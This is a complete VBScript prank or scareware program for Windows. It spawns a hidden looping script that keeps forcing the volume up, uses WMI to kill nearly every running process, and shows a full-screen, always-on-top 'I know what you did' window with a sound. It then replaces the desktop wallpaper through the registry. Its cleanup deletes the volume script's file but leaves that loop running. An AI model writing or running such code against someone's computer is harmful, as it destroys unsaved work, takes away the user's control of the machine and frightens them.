Set fso = CreateObject("Scripting.FileSystemObject")
scriptPath = fso.GetParentFolderName(WScript.ScriptFullName)
customWallpaper = fso.BuildPath(scriptPath, "hellome.jpg")
soundFile = fso.BuildPath(scriptPath, "balls.mp3") ' Path to the sound file

' Check if the image file exists in the same directory as the script
If Not fso.FileExists(customWallpaper) Then
    MsgBox "Wallpaper file not found in script directory: " & customWallpaper, vbCritical, "Error"
    WScript.Quit
End If

' Check if the sound file exists in the same directory as the script
If Not fso.FileExists(soundFile) Then
    MsgBox "Sound file not found in script directory: " & soundFile, vbCritical, "Error"
    WScript.Quit
End If

Set WshShell = CreateObject("WScript.Shell")

' Start a secondary script to continuously set the volume to maximum in the background
Dim volumeScriptPath
volumeScriptPath = fso.BuildPath(fso.GetSpecialFolder(2), "volume_control.vbs")
Set volumeScript = fso.CreateTextFile(volumeScriptPath, True)
volumeScript.WriteLine "Set WshShell = CreateObject(""WScript.Shell"")"
volumeScript.WriteLine "Do"
volumeScript.WriteLine "    WshShell.SendKeys(chr(&hAF)) ' Unmute if muted"
volumeScript.WriteLine "    For i = 1 To 50 ' Set volume to maximum"
volumeScript.WriteLine "        WshShell.SendKeys(chr(&hAF))"
volumeScript.WriteLine "    Next"
volumeScript.WriteLine "    WScript.Sleep 500 ' Adjust every 0.5 seconds"
volumeScript.WriteLine "Loop"
volumeScript.Close

' Run the volume control script in the background
WshShell.Run "wscript.exe """ & volumeScriptPath & """", 0, False

' Delay the execution by 10 seconds before setting wallpaper and displaying the HTA
WScript.Sleep 10000

' Close all non-essential foreground processes to focus on the HTA window
Dim objWMIService, colProcessList, objProcess
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
Set colProcessList = objWMIService.ExecQuery("SELECT * FROM Win32_Process")

For Each objProcess In colProcessList
    If LCase(objProcess.Name) <> "explorer.exe" And LCase(objProcess.Name) <> "mshta.exe" And LCase(objProcess.Name) <> "wscript.exe" Then
        On Error Resume Next  ' Ignore errors in case of protected processes
        objProcess.Terminate()
        On Error GoTo 0
    End If
Next

' Display the HTA window for notification
message = "I know what you did"
duration = 3000  ' Duration for HTA pop-up (3 seconds)

htmlCode = "<html><head><title>Notification</title><HTA:APPLICATION " & _
    "APPLICATIONNAME='Notification' " & _
    "BORDER='none' CAPTION='no' SHOWINTASKBAR='no' " & _
    "SINGLEINSTANCE='yes' WINDOWSTATE='maximize' " & _
    "ALWAYSONTOP='yes'></head>" & _
    "<body style='text-align:center; font-size:100px; background-color: #f0f0f0; margin:0; padding:0; height:100%;'>" & _
    "<div style='display:inline-block;'>" & message & "</div>" & _
    "<script type='text/javascript'>" & _
    "window.moveTo(0, 0); " & _
    "window.resizeTo(screen.width, screen.height);" & _
    "setTimeout(function() { window.close(); }, " & duration & ");" & _
    "</script></body></html>"

' Create and execute the HTA file for the pop-up
Set tempFile = fso.CreateTextFile(fso.GetSpecialFolder(2) & "\temp.hta", True)
tempFile.WriteLine htmlCode
tempFile.Close

' Start playing the sound file
Set WMP = CreateObject("WMPlayer.OCX.7")
WMP.URL = soundFile
WMP.controls.play

' Run the HTA window
WshShell.Run "mshta.exe """ & fso.GetSpecialFolder(2) & "\temp.hta""", 1, False

' Pause for the pop-up duration
WScript.Sleep duration

' Wait until the sound finishes playing before continuing
Do While WMP.playState <> 1 ' 1 means stopped
    WScript.Sleep 100 ' Check every 0.1 seconds
Loop

' Set the wallpaper after the pop-up is closed
WshShell.RegWrite "HKCU\Control Panel\Desktop\Wallpaper", customWallpaper, "REG_SZ"
WshShell.RegWrite "HKCU\Control Panel\Desktop\WallpaperStyle", "2", "REG_SZ"
WshShell.RegWrite "HKCU\Control Panel\Desktop\TileWallpaper", "0", "REG_SZ"
WshShell.Run "RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters ,1 ,True", 0, True

' Cleanup
fso.DeleteFile fso.GetSpecialFolder(2) & "\temp.hta"
fso.DeleteFile volumeScriptPath, True

' Exit the script
WScript.Quit
